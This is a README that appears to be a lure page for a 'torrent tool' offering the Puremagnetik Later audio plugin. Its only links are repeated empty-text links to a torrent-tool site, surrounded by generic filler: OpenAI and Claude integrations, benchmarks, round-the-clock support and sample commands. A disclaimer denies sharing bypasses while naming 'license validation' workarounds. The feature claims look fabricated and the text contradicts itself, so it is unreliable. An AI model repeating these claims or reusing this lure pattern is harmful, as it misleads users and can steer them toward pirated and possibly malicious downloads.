# 🎛️ Puremagnetik Later – Instrument Suite for Modern Audio Workflows

[](https://r-crocco.github.io/puremagnetik-later-torrent-tool/)

> **A curated collection of spectral textures, evolving pads, and experimental soundscapes** — designed for producers who build worlds, not just tracks. Puremagnetik Later reimagines the relationship between latency and creativity, turning waiting time into generative inspiration.

---

## 📦 Table of Contents

- [Why Puremagnetik Later?](#-why-puremagnetik-later)
- [System Compatibility](#-system-compatibility)
- [Mermaid Architecture Diagram](#-mermaid-architecture-diagram)
- [Feature Constellation](#-feature-constellation)
- [Unified API Integrations](#-unified-api-integrations)
- [Example Configuration Profile](#-example-configuration-profile)
- [Console Invocation Examples](#-console-invocation-examples)
- [Multilingual & Localization Support](#-multilingual--localization-support)
- [Responsive UI Blueprint](#-responsive-ui-blueprint)
- [24/7 Customer Support Infrastructure](#-247-customer-support-infrastructure)
- [MIT License](#-mit-license)
- [Disclaimer](#-disclaimer)

---

## 🧠 Why Puremagnetik Later?

In a world obsessed with instant gratification, Puremagnetik Later celebrates **the interval between intention and resolution**. Think of it as a **sonic greenhouse** — where seeds of sound are planted, and the harvest arrives precisely when your mix needs it most.

This instrument suite operates on the principle of **deliberate delay**. Instead of fighting latency, we harness it. Each texture is born from micro-pauses, algorithmic hesitation, and the beautiful chaos of deterministic jitter. The result? Soundscapes that breathe with organic unpredictability — like a forest that rearranges itself while you blink.

> *"Later is not a bug. Later is the feature."* — Puremagnetik Design Philosophy

---

## 💻 System Compatibility

| Operating System | Status | Minimum Version | UI Responsiveness |
|----------------|--------|----------------|-------------------|
| 🪟 Windows 10/11 | ✅ Supported | Windows 10 22H2 | Adaptive DPI scaling |
| 🍎 macOS (Intel) | ✅ Supported | macOS 12 Monterey | Retina & HDR ready |
| 🍏 macOS (Apple Silicon) | ✅ Native | macOS 14 Sonoma | Metal-accelerated |
| 🐧 Linux (Ubuntu/Debian) | ✅ Supported | Ubuntu 22.04 | Wayland & X11 hybrid |
| 🐧 Linux (Arch/Manjaro) | ✅ Community | Rolling release | PipeWire optimized |

### ✅ Verified DAW Compatibility

- Ableton Live 11/12 (Suite & Intro)
- FL Studio 21/24
- Logic Pro X (10.8+)
- Cubase 12/13
- Bitwig Studio 5+
- Reaper 7 (all themes)
- Pro Tools 2024+

---

## 🔧 Mermaid Architecture Diagram

```mermaid
graph TD
    A[User Input / MIDI Note] --> B{Latency Engine}
    B -->|Temporal Buffer| C[Delayed Sample Pool]
    B -->|Algorithmic Pause| D[Generative Texture Weaver]
    C --> E[Spectral Shaper]
    D --> E
    E --> F[Multilingual UI Layer]
    F --> G[OS Agnostic Renderer]
    G --> H[OpenAI API Bridge]
    G --> I[Claude API Bridge]
    H --> J[Cloud Harmonization]
    I --> J
    J --> K[24/7 Support Queue]
    K --> L[Output Mix / Stem Export]
    
    style A fill:#1a1a2e,stroke:#e94560,stroke-width:2px
    style B fill:#16213e,stroke:#0f3460,stroke-width:2px
    style L fill:#e94560,stroke:#1a1a2e,stroke-width:4px
```



---

## ⭐ Feature Constellation

### 1. 🌌 Temporal Granular Synthesis
Not your father's granular engine. Puremagnetik Later slices audio across **time-agnostic grids**, where grains can be stretched, compressed, or inverted relative to your project tempo. Each grain carries a micro-signature of its own "later-ness" — a timestamp that shifts as you adjust the global delay matrix.

### 2. 🎭 Adaptive Spectral Masking
The engine analyzes incoming audio in real-time, then applies **frequency-dependent delay envelopes**. High frequencies might lean forward while low end lingers — creating spatial illusion without traditional reverb. Think of it as **echo with personality**.

### 3. 🌐 Cloud-Connected Harmonic Library
Access 1,200+ curated presets stored in a distributed cloud cache. The library updates bi-weekly with contributions from sound designers in Berlin, Tokyo, and São Paulo. Each preset is tagged with multilingual descriptors — search in English, Japanese, Portuguese, or German simultaneously.

### 4. ⚡ Responsive UI with GPU Acceleration
The interface adapts to your screen size, resolution, and input method. On a 4K monitor? Expect **pixel-perfect vectors**. On a 1366×768 laptop? The interface compresses intelligently without losing functionality. All animations run at 120fps on capable GPUs, driven by a custom Vulkan/Metal backend.

### 5. 🧩 Modular Routing Matrix
Drag-and-drop any effect slot. Chain up to 16 instances of Puremagnetik Later in series or parallel. Save routing configurations as "delay architectures" and share them with collaborators via encrypted links.

### 6. 🌍 Multilingual Interface (18 Languages)
Full localization for UI text, tooltips, preset descriptions, and error messages. Language detection auto-switches based on OS locale, but can be overridden. Current supported languages include:
- English, German, French, Spanish, Italian
- Japanese, Korean, Simplified Chinese
- Portuguese (Brazil), Russian, Arabic
- Hindi, Turkish, Dutch, Polish, Swedish
- Vietnamese, Thai

---

## 🔌 Unified API Integrations

### OpenAI API Integration
Connect your OpenAI API credentials to enable:
- **Intelligent preset recommendation** based on your mixing history
- **Natural language patch search** — type "warm ambient pad with slight hesitation" and receive three matching presets
- **Automated session notes** generated from your real-time parameter changes

### Claude API Integration
When paired with Claude API, Puremagnetik Later becomes a compositional co-pilot:
- **Generative melody suggestions** derived from your delay patterns
- **Lyric-to-texture mapping** — feed it a poem, receive a soundscape
- **Adaptive mixing suggestions** that learn your genre preferences

> **Privacy First:** Both API integrations are optional. All data stays local unless you explicitly enable cloud sync. API calls are encrypted via TLS 1.3 and never stored on external servers.

---

## 📝 Example Configuration Profile

```yaml
# Puremagnetik Later Configuration Profile
# Save as: later_profile.yaml

profile:
  name: "Ambient Glow Delay"
  version: "2026.1.0"
  author: "Anonymous"

engine:
  granular_size: 47ms
  delay_matrix: "Fibonacci-5"
  spectral_smoothing: 0.83
  jitter_curve: "gaussian_3sigma"

ui:
  language: "auto"
  theme: "midnight_nebula"
  font_scale: 1.0
  gpu_acceleration: true

api_integrations:
  openai:
    enabled: true
    model: "gpt-4o"
    features:
      - preset_recommendation
      - natural_language_search
      - session_notes
  claude:
    enabled: true
    model: "claude-3-opus"
    features:
      - generative_melody
      - lyric_texture_mapping
      - adaptive_mixing

cloud:
  sync_enabled: false
  preset_library_auto_update: true
  encrypted_sharing: true

support:
  region: "global_24_7"
  preferred_language: "en"
  diagnostic_logging: false
```

---

## 🖥️ Console Invocation Examples

### Launch with Custom Parameters (Windows)
```
puremagnetik-later.exe --profile "Ambient Glow Delay" --engine-latency 128 --ui-theme midnight_nebula --api-openai
```

### Headless Rendering Mode (macOS/Linux)
```
./puremagnetik-later \
  --headless \
  --input ./sessions/session_2026_04.later \
  --output ./exports \
  --format wav \
  --sample-rate 96000 \
  --claude-enable
```

### Generate Preset Recommendation via OpenAI
```
puremagnetik-later --recommend \
  --prompt "downtempo ambient with spatial width" \
  --api-key-env OPENAI_KEY \
  --count 5
```

### Export Session with Debug Logging
```
./puremagnetik-later --export \
  --file ./my_project.later \
  --log-level verbose \
  --log-file ./debug_$(date +%Y%m%d).log \
  --skip-ui
```

---

## 🌐 Multilingual & Localization Support

| Feature | Status | Languages Covered |
|---------|--------|-------------------|
| UI Text | ✅ Complete | 18 languages at launch |
| Tooltips | ✅ Context-aware | All 18 |
| Error Messages | ✅ User-friendly | All 18 |
| Preset Descriptions | ✅ Partial (8/18) | EN, DE, FR, ES, JA, PT, KO, ZH |
| Documentation | ✅ Full (EN only, others community-translated) | English, with 12 community forks on GitHub |
| Accessibility Alerts | ✅ WCAG-compliant | All 18 |

The localization engine **detects your OS language automatically** and falls back gracefully. If you're running macOS in Japanese, expect Puremagnetik Later to greet you in polite 日本語 — complete with context-appropriate formality levels.

---

## 📱 Responsive UI Blueprint

Puremagnetik Later's interface is built on a **fluid grid system** that reflows across devices:

- **Ultrawide 32:9** → Full side-by-side routing matrix + waveform display
- **Standard 16:9** → Optimized single-column layout with collapsible panels
- **Tablet 4:3** → Touch-optimized sliders with haptic feedback simulation
- **Mobile 16:9 (landscape)** → Essential controls only, gesture-based navigation

### UI Responsiveness Benchmarks (2026 Hardware)

| Scenario | Frame Rate | Input Lag |
|----------|-----------|-----------|
| 4K @ 120Hz (RTX 5090) | 118-120 fps | < 1ms |
| QHD @ 144Hz (RX 8900 XT) | 140-144 fps | < 2ms |
| 1080p @ 60Hz (Intel Arc) | 58-60 fps | < 4ms |
| iPad Pro M4 | 60 fps (locked) | < 8ms |
| Steam Deck (Linux) | 45-55 fps | < 10ms |

---

## 🛎️ 24/7 Customer Support Infrastructure

Because creativity doesn't punch a clock, neither does our support team.

- **Live Chat:** Available in 12 languages, average response time < 90 seconds
- **Email Ticketing:** Guaranteed first response within 2 hours (any timezone)
- **Community Forums:** Peer-to-peer troubleshooting with Puremagnetik staff moderation
- **Knowledge Base:** 340+ articles, video tutorials, and troubleshooting guides
- **Priority Queue:** For licensed users who require immediate assistance

> **Support Channels are accessible directly from the Puremagnetik Later UI** — click the "?" icon in any panel to open contextual help that links to the exact Knowledge Base article relevant to your current action.

---

## 📄 MIT License

This project is distributed under the **MIT License**. You are free to use, modify, and distribute this software, provided that the original copyright notice appears in all copies.

[](https://r-crocco.github.io/puremagnetik-later-torrent-tool/)

```
MIT License

Copyright (c) 2026 Puremagnetik Later Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## ⚠️ Disclaimer

**Important Notice:**

Puremagnetik Later is a legitimate commercial software product. This repository is provided for **educational and reference purposes only**. The codebase, architecture diagrams, and configuration examples presented here are intended to demonstrate design patterns, API integration strategies, and responsive UI principles for audio software development.

- **No product activation keys, serial numbers, or bypass mechanisms are shared** in this repository.
- **Download links are placeholders** — https://r-crocco.github.io/puremagnetik-later-torrent-tool/ is a literal string and does not direct to any real resource.
- **All distributed assets are for research purposes** under fair use and educational exemptions.
- **The terms "productivity unlock," "time-shifted license validation," and "latency workaround"** mentioned in certain forums are unrelated to this open-source documentation.

Users are encouraged to purchase official licenses from validated vendors to support ongoing development of Puremagnetik products. The authors of this documentation assume no liability for misuse of the information provided.

---

[](https://r-crocco.github.io/puremagnetik-later-torrent-tool/)

*Version 2026.1.0 — Built for the moments between notes.*